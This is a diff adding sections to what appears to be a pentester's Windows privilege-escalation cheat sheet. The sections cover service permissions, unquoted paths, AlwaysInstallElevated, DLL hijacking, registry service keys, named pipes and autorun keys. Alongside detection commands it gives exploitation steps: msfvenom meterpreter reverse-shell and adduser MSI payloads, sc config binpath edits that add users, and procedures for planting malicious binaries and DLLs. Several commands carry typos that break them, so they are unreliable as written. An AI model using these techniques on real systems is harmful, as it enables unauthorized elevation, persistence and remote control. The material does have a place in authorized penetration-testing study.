@@ -158,6 +158,13 @@ cacls c:\path\ /T /E /G user:f
 icacls dir /grant Administrators:F /T /C
 	-grant user full file access control from path
 takeown /R /A /F dir /D N
+ICACLS Flags:
+	F (full access)
+	M (modify access)
+	RX (read and execute access)
+	R (read-only access)
+	W (write-only access)
+
 
 NETWORK
 arp -A
@@ -597,7 +604,35 @@ msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0
 sc stop target
 sc start target
 	-now the reverse shell should be spawned as privileged user
+Insecure Service Permissions (binPath)
+Detection:
+ps -aux
+	-find services
+sc.exe sdshow <service_name>
+OR
+accesschk.exe –uvwc <service_name>
+	-from sysinternals suite
+Exploitation
+sc.exe config <service_name> binpath = <command>
+Metasploit: exploit/windows/local/trusted_service_path
+	
+	
+Unquoted Path:
+Occurance: service executable path is not enclosed with quotation marks and contains space
+rights to replace any execution file in the target folder with malicious .exe file, next system boot or services call will run a planted malicious .exe
+services called will look for the first exe file in order:
+1. C:\Program.exe
+2. C:\Program Files\Service.exe
+3. C:\Program Files\Service Directory\binary.exe
+4. C:\Program Files\Service Directory\binary name.exe
+Detect
+wmic service get ne,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """
+icacls "C:\Program Files (x86)\Program Folder"
+Exploitation
+created payload (e.g. msfvenom) .exe
+replace target .exe file with malicious .exe
 
+	
 Vulnerable Services
 	exploit/windows/local/service_permissions
 accesschk.exe -uwcqv "Authenticated Users" * /accepteula
@@ -618,13 +653,48 @@ AlwaysInstallElevated
 	exploit/windows/local/always_install_elevated
 reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
 reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
+	-check for value 1
 msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o exploit.msi
 msiexec /quiet /qn /i C:\Users\User\Downloads\exploit.msi
+Detection
+Get-Property <register-key>
+Reg.exe query <registry key>
+Detection/Exploitation
+Powerup.ps1
+Metasploit: exploit/windows/local/always_install_elevated
+
 
 DLL Injection
 msfvenom -p windows/meterpreter/reverse_https -e x86/shikata_ga_nai LHOST=10.0.0.100 LPORT=443 -f exe -o target.exe
 https://www.exploit-db.com/dll-hijacking-vulnerable-applications/
 https://www.corelan.be/index.php/2010/08/25/dll-hijacking-kb-2269637-the-unofficial-list/
+In Windows environments when an application or a service is starting it looks for a number of DLL’s in
+order to function properly, if these DLL’s doesn't exist or didn’t written in a good way that mentioned a
+fully qualified path then attacker can gain privilege on victim machine.
+When application or service look for DLL it will pass throw order that Microsoft assigned that order to let
+the application search for their DLL’s from top to bottom.
+1. The directory from which the application is loaded
+2. C:\Windows\System32
+3. C:\Windows\System
+4. C:\Windows
+5. The current working directory
+6. Directories in the system PATH environment variable
+	-Detect with:
+	--Process Monitor (sysinternals suite)
+	--rattler	(https://github.com/sensepost/rattler)
+				https://github.com/sensepost/rattler/releases/download/v1.0/payload.dll
+				https://github.com/sensepost/rattler/releases/download/v1.0/Rattler_32.exe
+				https://github.com/sensepost/rattler/releases/download/v1.0/Rattler_x64.exe
+		-ratter_32.exe "c:\path\to\target\application.exe" 1
+		--1 denotes enuermation mode
+		--replace vulnerable dll with rattler's payload.dll
+process of exploiting DLL
+1. Find the missing DLL using process monitor
+2. make sure that you can write on the missing DLL folder
+3. Create your payload as DLL (e.g. by using msfvenom)
+4. Pass DLL to the target directory
+5. On system restart or the process re-open should exploit
+
 
 Change the upnp service binary
 sc qc upnphostsc config upnphost binpath= "net user <username> /add"
@@ -633,6 +703,57 @@ net stop upnphost
 net start upnphost
 
 
+Service Registry key
+-registry is a hierarchical database that contains data critical for operation of Windows applications and services 
+	-data is structured in a tree format
+	-each node in the tree is called a key
+HKLMISYSTEM\CurrentControleSet\Services
+	-Access to registry keys is controlled by the Windows Security model
+	-Insecure permissions can be found in the registry keys associated with a service
+Detect
+powershell.exe Get-Acl -Path hklm:\System\CurrentControleSet\Service\* |Select Path,AccessToString | Format-List
+Accesschk.exe –kvusw hklm\System\CurrentControleSet\Service
+	-sysinterals
+Exploitation
+create malicious service binary
+	-msfvenom –p windows/exec CMD=<Command> -f exe-services –o <service binery>
+Reg.exe add HKLM\System\CurrentControleSet\Service\<Service name> /v ImagePath /t REG_EXPAND_SZ /d <path_to_exe> /f
+	-overwrite the imagepath subkey of the valuable services with the path of the custom binary
+	
+	
+Named Pipes
+-named pipe is a mechanism that enables interprocess communication for applications to communicate locally or remotely
+-to manipulate the pipe we should find a pipe that has weak permeation to “Authentic users” or “Everyone” group
+-attacker impersonates higher privilege account and if target account already in the memory	
+Detect
+Process Explorer
+	-sysinternals suite
+Pipelist
+	-sysinternals suite
+powershell.exe [System.IO.Diroctory]::GetFiles(“\\.\\pipe\\”)
+Pipsec.exe
+	-lists the DACLs for each pipe
+	
+	
+Autorun
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Run
+HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunService
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceService
+HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunService
+HKEY_LOCAL_MACHINE\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnceService
+Detection
+powershell.exe Get-Property <register-key>
+Reg.exe query <registry key>
+PowerUp.ps1
+Autoruns
+	-sysinterals suite
+Exploitation
+Create malicious .exe file
+Rename and copy the exe file to identified target location
+	
 	
 references
 http://www.fuzzysecurity.com/tutorials/16.html
